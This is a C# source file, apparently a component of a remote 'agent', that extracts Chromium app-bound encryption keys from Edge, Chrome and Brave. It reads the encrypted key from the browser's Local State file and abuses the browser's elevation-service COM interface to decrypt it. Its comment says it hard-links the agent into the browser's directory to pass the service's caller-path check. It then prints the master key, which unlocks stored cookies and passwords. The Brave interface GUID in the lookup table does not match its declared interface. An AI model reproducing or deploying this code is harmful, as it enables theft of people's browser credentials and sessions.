using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace KliveLink.Agent.V2;

/// <summary>
/// Decrypts the Chromium app-bound encryption key by calling the browser's own
/// elevation-service COM object. The service validates the caller's path, so this
/// helper must run from a file inside the browser's Application directory. The agent
/// creates a hard link to itself there for the duration of the call.
/// </summary>
internal static class AbeHelper
{
    private const uint ClsCtxLocalServer = 4;
    private const uint RpcCAuthnDefault = 0xFFFFFFFF;
    private const uint RpcCAuthzDefault = 0xFFFFFFFF;
    private const uint RpcCAuthnLevelPktPrivacy = 6;
    private const uint RpcCImpLevelImpersonate = 3;
    private const uint EoacDynamicCloaking = 0x40;

    [DllImport("ole32.dll")]
    private static extern int CoInitializeEx(IntPtr reserved, uint coinit);

    [DllImport("ole32.dll")]
    private static extern void CoUninitialize();

    [DllImport("ole32.dll")]
    private static extern int CoCreateInstance(ref Guid clsid, IntPtr outer, uint context, ref Guid iid, out IntPtr instance);

    [DllImport("ole32.dll")]
    private static extern int CoSetProxyBlanket(IntPtr proxy, uint authnSvc, uint authzSvc, IntPtr serverPrincipleName,
        uint authnLevel, uint impLevel, IntPtr authInfo, uint capabilities);

    [DllImport("oleaut32.dll")]
    private static extern IntPtr SysAllocStringByteLen(byte[] data, uint length);

    [DllImport("oleaut32.dll")]
    private static extern void SysFreeString(IntPtr bstr);

    [DllImport("oleaut32.dll")]
    private static extern uint SysStringByteLen(IntPtr bstr);

    [ComImport, Guid("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IEdgeElevatorBase
    {
        [PreserveSig] int Placeholder1();
        [PreserveSig] int Placeholder2();
        [PreserveSig] int Placeholder3();
    }

    [ComImport, Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IEdgeElevator : IEdgeElevatorBase
    {
        [PreserveSig] int RunRecoveryCRXElevated(IntPtr crxPath, IntPtr appId, IntPtr version, IntPtr sessionId, uint callerPid, out IntPtr procHandle);
        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out uint lastError);
        [PreserveSig] int DecryptData(IntPtr ciphertext, out IntPtr plaintext, out uint lastError);
    }

    [ComImport, Guid("C9C2B807-7731-4F34-81B7-44FF7779522B"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IEdgeElevatorFinal
    {
        [PreserveSig] int Placeholder1();
        [PreserveSig] int Placeholder2();
        [PreserveSig] int Placeholder3();
        [PreserveSig] int RunRecoveryCRXElevated(IntPtr crxPath, IntPtr appId, IntPtr version, IntPtr sessionId, uint callerPid, out IntPtr procHandle);
        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out uint lastError);
        [PreserveSig] int DecryptData(IntPtr ciphertext, out IntPtr plaintext, out uint lastError);
    }

    [ComImport, Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IChromeElevator
    {
        [PreserveSig] int RunRecoveryCRXElevated(IntPtr crxPath, IntPtr appId, IntPtr version, IntPtr sessionId, uint callerPid, out IntPtr procHandle);
        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out uint lastError);
        [PreserveSig] int DecryptData(IntPtr ciphertext, out IntPtr plaintext, out uint lastError);
    }

    [ComImport, Guid("8F7B6792-784D-4047-845D-1782EFBEF205"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IChromeElevator2
    {
        [PreserveSig] int RunRecoveryCRXElevated(IntPtr crxPath, IntPtr appId, IntPtr version, IntPtr sessionId, uint callerPid, out IntPtr procHandle);
        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out uint lastError);
        [PreserveSig] int DecryptData(IntPtr ciphertext, out IntPtr plaintext, out uint lastError);
    }

    [ComImport, Guid("F396861E-0C8E-4C71-8256-2FAE6D759CE9"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IBraveElevator
    {
        [PreserveSig] int RunRecoveryCRXElevated(IntPtr crxPath, IntPtr appId, IntPtr version, IntPtr sessionId, uint callerPid, out IntPtr procHandle);
        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out uint lastError);
        [PreserveSig] int DecryptData(IntPtr ciphertext, out IntPtr plaintext, out uint lastError);
    }

    private sealed record BrowserConfig(Guid Clsid, Guid Iid, bool Edge);

    private static BrowserConfig? Config(string browser) => browser.ToLowerInvariant() switch
    {
        "edge" => new(Guid.Parse("1FCBE96C-1697-43AF-9140-2897C7C69767"), Guid.Parse("C9C2B807-7731-4F34-81B7-44FF7779522B"), true),
        "chrome" => new(Guid.Parse("708860E0-F641-4611-8895-7D867DD3675B"), Guid.Parse("463ABECF-410D-407F-8AF5-0DF35A005CC8"), false),
        "brave" => new(Guid.Parse("576B31AF-6369-4B6B-8560-E4B203A97A8B"), Guid.Parse("F396861E-0C8E-4C71-8256-2FAE6D759C9E"), false),
        _ => null,
    };

    public static int Run(string[] args)
    {
        if (args.Length < 3)
        {
            Console.Error.WriteLine("usage: --abe-helper <edge|chrome|brave> <local-state-path>");
            return 2;
        }
        string browser = args[1];
        string localState = args[2];
        BrowserConfig? config = Config(browser);
        if (config == null)
        {
            Console.Error.WriteLine("unknown browser " + browser);
            return 2;
        }
        try
        {
            byte[]? key = DecryptKey(config, localState);
            if (key == null)
            {
                Console.Error.WriteLine("abe decrypt failed");
                return 3;
            }
            Console.WriteLine("ABEKEY:" + Convert.ToBase64String(key));
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex.ToString());
            return 1;
        }
    }

    private static byte[]? DecryptKey(BrowserConfig config, string localStatePath)
    {
        using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(localStatePath));
        if (!doc.RootElement.TryGetProperty("os_crypt", out JsonElement osCrypt) ||
            !osCrypt.TryGetProperty("app_bound_encrypted_key", out JsonElement encryptedKey))
            return null;
        string? encoded = encryptedKey.GetString();
        if (string.IsNullOrWhiteSpace(encoded)) return null;
        byte[] blob = Convert.FromBase64String(encoded);
        if (blob.Length < 5 || Encoding.ASCII.GetString(blob, 0, 4) != "APPB") return null;
        byte[] ciphertext = blob[4..];

        int init = CoInitializeEx(IntPtr.Zero, 0);
        try
        {
            IntPtr bstr = SysAllocStringByteLen(ciphertext, (uint)ciphertext.Length);
            IntPtr keyPtr = IntPtr.Zero;
            try
            {
                object? elevator = Create(config, out int createError);
                if (elevator == null)
                {
                    Console.Error.WriteLine($"CoCreateInstance 0x{createError:X8}");
                    return null;
                }
                int hr;
                uint lastError;
                if (elevator is IEdgeElevatorFinal edge)
                    hr = edge.DecryptData(bstr, out keyPtr, out lastError);
                else if (elevator is IChromeElevator chrome)
                    hr = chrome.DecryptData(bstr, out keyPtr, out lastError);
                else if (elevator is IChromeElevator2 chrome2)
                    hr = chrome2.DecryptData(bstr, out keyPtr, out lastError);
                else if (elevator is IBraveElevator brave)
                    hr = brave.DecryptData(bstr, out keyPtr, out lastError);
                else
                {
                    Console.Error.WriteLine("elevator interface mismatch");
                    return null;
                }
                Console.Error.WriteLine($"DecryptData hr=0x{hr:X8} last={lastError}");
                if (hr != 0 || keyPtr == IntPtr.Zero) return null;
                uint length = SysStringByteLen(keyPtr);
                if (length == 0) return null;
                byte[] key = new byte[length];
                Marshal.Copy(keyPtr, key, 0, key.Length);
                return key.Length >= 32 ? key[^32..] : null;
            }
            finally
            {
                if (bstr != IntPtr.Zero) SysFreeString(bstr);
                if (keyPtr != IntPtr.Zero) SysFreeString(keyPtr);
            }
        }
        finally
        {
            try { if (init >= 0) CoUninitialize(); } catch { }
        }
    }

    private static object? Create(BrowserConfig config, out int error)
    {
        Guid clsid = config.Clsid;
        Guid iid = config.Iid;
        error = CoCreateInstance(ref clsid, IntPtr.Zero, ClsCtxLocalServer, ref iid, out IntPtr pointer);
        if (error != 0 || pointer == IntPtr.Zero) return null;
        try
        {
            CoSetProxyBlanket(pointer, RpcCAuthnDefault, RpcCAuthzDefault, IntPtr.Zero,
                RpcCAuthnLevelPktPrivacy, RpcCImpLevelImpersonate, IntPtr.Zero, EoacDynamicCloaking);
            object com = Marshal.GetObjectForIUnknown(pointer);
            if (config.Edge) return com as IEdgeElevatorFinal;
            if (com is IChromeElevator chrome) return chrome;
            if (com is IChromeElevator2 chrome2) return chrome2;
            if (com is IBraveElevator brave) return brave;
            return null;
        }
        finally
        {
            Marshal.Release(pointer);
        }
    }
}
